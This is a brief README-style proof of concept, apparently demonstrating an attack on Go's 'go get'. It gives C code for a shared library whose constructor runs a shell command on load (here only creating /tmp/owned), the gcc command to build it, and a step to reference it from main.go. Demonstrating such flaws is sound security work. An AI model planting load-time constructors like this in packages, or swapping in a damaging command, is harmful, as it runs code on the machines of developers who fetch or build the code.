# Malicious payload to exploit go get

1. Create ```attack.c``` file:
  ```c
  #include<stdio.h>
	#include<stdlib.h>
	 
	static void malicious() __attribute__((constructor));
	 
	void malicious() {
	    system("touch /tmp/owned");
	}
  ```
2. Compile it
  - ```gcc -shared -o attack.so -fPIC attack.c```
3. Refer to the ```.so``` file in the ```main.go``` file.
